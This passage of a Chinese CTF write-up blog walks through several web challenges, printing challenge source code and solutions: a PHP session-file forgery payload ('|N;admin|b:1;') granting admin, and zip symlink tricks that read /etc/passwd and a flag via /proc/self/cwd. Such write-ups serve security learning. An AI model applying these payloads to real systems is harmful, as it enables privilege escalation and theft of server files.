class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//lib.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">redirect</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: &#x27;</span> . <span class="hljs-variable">$path</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-comment">// utility functions</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>, ENT_QUOTES);<br>&#125;<br><br><span class="hljs-comment">// user-related functions</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">validate_user</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$user</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\A[0-9A-Z_-]&#123;4,64&#125;\z/i&#x27;</span>, <span class="hljs-variable">$user</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_logged_in</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_user</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>) </span>&#123;<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$user</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_user</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_admin</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// note-related functions</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_notes</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>] = [];<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_note</span>(<span class="hljs-params"><span class="hljs-variable">$title</span>, <span class="hljs-variable">$body</span></span>) </span>&#123;<br>  <span class="hljs-variable">$notes</span> = <span class="hljs-title function_ invoke__">get_notes</span>();<br>  <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$notes</span>, [<br>    <span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span class="hljs-variable">$title</span>,<br>    <span class="hljs-string">&#x27;body&#x27;</span> =&gt; <span class="hljs-variable">$body</span>,<br>    <span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">hash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-title function_ invoke__">microtime</span>())<br>  ]);<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>] = <span class="hljs-variable">$notes</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find_note</span>(<span class="hljs-params"><span class="hljs-variable">$notes</span>, <span class="hljs-variable">$id</span></span>) </span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$index</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$notes</span>); <span class="hljs-variable">$index</span>++) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$notes</span>[<span class="hljs-variable">$index</span>][<span class="hljs-string">&#x27;id&#x27;</span>] === <span class="hljs-variable">$id</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable">$index</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete_note</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>) </span>&#123;<br>  <span class="hljs-variable">$notes</span> = <span class="hljs-title function_ invoke__">get_notes</span>();<br>  <span class="hljs-variable">$index</span> = <span class="hljs-title function_ invoke__">find_note</span>(<span class="hljs-variable">$notes</span>, <span class="hljs-variable">$id</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$index</span> !== <span class="hljs-literal">FALSE</span>) &#123;<br>    <span class="hljs-title function_ invoke__">array_splice</span>(<span class="hljs-variable">$notes</span>, <span class="hljs-variable">$index</span>, <span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>] = <span class="hljs-variable">$notes</span>;<br>&#125;<br><span class="hljs-comment">//export.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;init.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_logged_in</span>()) &#123;<br>  <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/easy-notes/?page=home&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$notes</span> = <span class="hljs-title function_ invoke__">get_notes</span>();<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$type</span> = <span class="hljs-string">&#x27;zip&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$type</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>];<br>&#125;<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">get_user</span>() . <span class="hljs-string">&#x27;-&#x27;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>)) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$type</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$filename</span>); <span class="hljs-comment">// avoid path traversal</span><br><span class="hljs-variable">$path</span> = TEMP_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$filename</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$type</span> === <span class="hljs-string">&#x27;tar&#x27;</span>) &#123;<br>  <span class="hljs-variable">$archive</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PharData</span>(<span class="hljs-variable">$path</span>);<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// use zip as default</span><br>  <span class="hljs-variable">$archive</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span>, ZIPARCHIVE::<span class="hljs-variable constant_">CREATE</span> | <span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">OVERWRITE</span>);<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$index</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$notes</span>); <span class="hljs-variable">$index</span>++) &#123;<br>  <span class="hljs-variable">$note</span> = <span class="hljs-variable">$notes</span>[<span class="hljs-variable">$index</span>];<br>  <span class="hljs-variable">$title</span> = <span class="hljs-variable">$note</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>  <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^!-~]/&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$title</span>);<br>  <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;#[/\\?*.]#&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$title</span>); <span class="hljs-comment">// delete suspicious characters</span><br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$index&#125;</span>_<span class="hljs-subst">&#123;$title&#125;</span>.json&quot;</span>, <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$note</span>));<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$type</span> === <span class="hljs-string">&#x27;tar&#x27;</span>) &#123;<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;&quot;;&#x27;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$path</span>));<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/zip&#x27;</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-comment">//init.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">session_save_path</span>(TEMP_DIR);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-comment">//config.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;TEMP_DIR&#x27;</span>, <span class="hljs-string">&#x27;tmp/&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>代码不难理解，主要是这么个东西：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_admin</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其实前面也做过一些<code>SESSION</code>的题，现在稍微有点思路：</p><blockquote><p>1.php的session默认存储文件名是sess_+PHPSESSID的值</p><p>2.抓包获得session值由此获得相应存储文件，然后判断引擎修改相应文件</p></blockquote><p>但还是老问题，下载文件抓包是这个，没法实现任意文件下载：</p><p><img src="/img/SWPU2019Web32.png" alt="SWPU2019Web32"></p><p>下载的文件名类似这种：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">get_user</span>() . <span class="hljs-string">&#x27;-&#x27;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>)) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$type</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$filename</span>); <span class="hljs-comment">// avoid path traversal</span><br></code></pre></td></tr></table></figure><p><img src="/img/SWPU2019Web33.png" alt="SWPU2019Web33"></p><p><code>user</code>这东西我们可以控制，可以设置成类似<code>sess_</code>这种，但他后面给加了个<code>-</code>和十六位十六进制的随机字符串。。<code>type</code>的话通过设置成<code>.</code>然后被替换为空，这时我们下载的文件就是：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">sess_-随机十六位十六进制<br></code></pre></td></tr></table></figure><p>一开始以为<code>session</code>文件不能带横线，后面查了一下，只要这种格式都可以：</p><p>session 文件以 <code>sess_</code> 开头，且只含有 <code>a-z</code>，<code>A-Z</code>，<code>0-9</code>，<code>-</code>。</p><p>文件名解决了，不过压缩包中的数据如何处理也要考虑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">for</span> (<span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$index</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$notes</span>); <span class="hljs-variable">$index</span>++) &#123;<br>  <span class="hljs-variable">$note</span> = <span class="hljs-variable">$notes</span>[<span class="hljs-variable">$index</span>];<br>  <span class="hljs-variable">$title</span> = <span class="hljs-variable">$note</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>  <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^!-~]/&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$title</span>);<br>  <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;#[/\\?*.]#&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$title</span>); <span class="hljs-comment">// delete suspicious characters</span><br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$index&#125;</span>_<span class="hljs-subst">&#123;$title&#125;</span>.json&quot;</span>, <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$note</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>这里<code>title</code>完全可控：</p><p><img src="/img/SWPU2019Web34.png" alt="SWPU2019Web34"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">session.serialize_handler   <span class="hljs-built_in">string</span> <span class="hljs-comment">--定义用来序列化/反序列化的处理器名字。默认使用php</span><br>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值<br></code></pre></td></tr></table></figure><p>构造一个内容为<code>|N;admin|b:1;</code>的数据，<code>|N;</code>将前面的杂乱的数据作为一个键解决掉。</p><p>综上，构造<code>payload</code>步骤：</p><p>用户名<code>sess_</code>，<code>title</code>为<code>|N;admin|b:1;</code>。导出后抓包修改对应<code>PHPSESSIONID</code>即可。</p><h4 id="思路总结：-6"><a href="#思路总结：-6" class="headerlink" title="思路总结："></a>思路总结：</h4><p><code>session</code>文件名，反序列化引擎。</p><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">参考资料</a></p><h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>明文传输用户名和密码，而且这个cookie看着像<code>JWT</code>：</p><p><img src="/img/SWPU2019Web31.png" alt="SWPU2019Web31"></p><p>后续：靶场有问题，登录不上去。直接看了其它师傅的wp:</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105666388">参考资料</a></p><p><a href="https://hwlanxiaojun.github.io/2020/03/18/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/#0x-05-SWPU2019-Web3">参考资料</a></p><p>登录后会出现上传功能，但会提示权限不够。伪造session需要key，这个key在访问不存在的页面时被放到请求头里了，然后就是常规的session伪造。上传界面右键存在源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;id&#x27;</span>] != <span class="hljs-string">b&#x27;1&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template_string(temp)<br>    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:<br>        m = hashlib.md5()<br>        name = session[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        name = name+<span class="hljs-string">&#x27;qweqweqwe&#x27;</span><br>        name = name.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        m.update(name)<br>        md5_one= m.hexdigest()<br>        n = hashlib.md5()<br>        ip = request.remote_addr<br>        ip = ip.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        n.update(ip)<br>        md5_ip = n.hexdigest()<br>        f=request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        basepath=os.path.dirname(os.path.realpath(__file__))<br>        path = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>+md5_one+<span class="hljs-string">&#x27;/&#x27;</span>+session[<span class="hljs-string">&#x27;username&#x27;</span>]+<span class="hljs-string">&quot;/&quot;</span><br>        path_base = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span><br>        filename = f.filename<br>        pathname = path+filename<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> != filename.split(<span class="hljs-string">&#x27;.&#x27;</span>)[-<span class="hljs-number">1</span>]: <span class="hljs-comment">#按.分割filename，然后取最后一个元素判断是否为split</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;zip only allowed&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path_base):<br>            <span class="hljs-keyword">try</span>:<br>                os.makedirs(path_base)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):<br>            <span class="hljs-keyword">try</span>:<br>                os.makedirs(path)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(pathname):<br>            <span class="hljs-keyword">try</span>:<br>                f.save(pathname)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            cmd = <span class="hljs-string">&quot;unzip -n -d &quot;</span>+path+<span class="hljs-string">&quot; &quot;</span>+ pathname<br>            <span class="hljs-keyword">if</span> cmd.find(<span class="hljs-string">&#x27;|&#x27;</span>) != -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> cmd.find(<span class="hljs-string">&#x27;;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>waf()<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>            os.system(cmd)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        unzip_file = zipfile.ZipFile(pathname,<span class="hljs-string">&#x27;r&#x27;</span>)<br>        unzip_filename = unzip_file.namelist()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;is_login&#x27;</span>] != <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;not login&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> unzip_filename.find(<span class="hljs-string">&#x27;/&#x27;</span>) != -<span class="hljs-number">1</span>:<br>                shutil.rmtree(path_base)<br>                os.mkdir(path_base)<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>            image = <span class="hljs-built_in">open</span>(path+unzip_filename, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>            resp = make_response(image)<br>            resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span><br>            <span class="hljs-keyword">return</span> resp<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            shutil.rmtree(path_base)<br>            os.mkdir(path_base)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/showflag&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">showflag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == <span class="hljs-literal">False</span>:<br>        image = <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="hljs-string">&quot;rb&quot;</span>).read()<br>        resp = make_response(image)<br>        resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span><br>        <span class="hljs-keyword">return</span> resp<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can&#x27;t give you&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -s是Linux的一种软连接,类似与windows的快捷方式<br>ln -s <span class="hljs-regexp">/etc/</span>passwd forever404 这会出现一个forever404文本,里面包含密码<br><span class="hljs-regexp">/proc/</span>self 记录了系统运行的信息状态等,cwd 指向当前进程运行目录的一个符号链接,即flask运行进程目录<br><br>ln -s <span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cwd/</span>flag/flag.jpg test<br>zip -ry test.zip test<br>-r：表示递归地包含指定目录下的所有文件和子目录。<br>-y：表示将符号链接（symbolic links）作为符号链接保存，而不解引用它们。这通常用于在 ZIP 文件中保留符号链接的原始状态<br></code></pre></td></tr></table></figure><p>这题环境有问题只能这样随便写写了。。</p><h4 id="思路总结：-7"><a href="#思路总结：-7" class="headerlink" title="思路总结："></a>思路总结：</h4><p>软链接&#x2F;符号链接？<code>/proc/self/cwd</code>目录？在解压文件时可能会发生什么问题？</p><h2 id="羊城杯-2020-EasySer"><a href="#羊城杯-2020-EasySer" class="headerlink" title="[羊城杯 2020]EasySer"></a>[羊城杯 2020]EasySer</h2><p>?</p><p><img src="/img/yangchengbeiser1.png" alt="yangchengbeiser1"></p><p>存在<code>robots.php</code>，访问：<code>star1.php</code>:</p><p><img src="/img/yangchengbeiser2.png" alt="yangchengbeiser2"></p><p>右键源码，存在：</p><p><img src="/img/yangchengbeiser3.png" alt="yangchengbeiser3"></p><p><code>不安全的协议从我家进入ser.php</code>，最开始试了试<code>http://127.0.0.1/ser.php</code>发现重定向到<code>baidu</code>了，以为这里用的<code>parse_url</code>解析又试了其他的也不行。。后面才知道是火狐的问题，他不允许在这个页面嵌入其它网站的页面导致我一直访问不了这个<code>ser.php</code></p><p>直接看的wp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 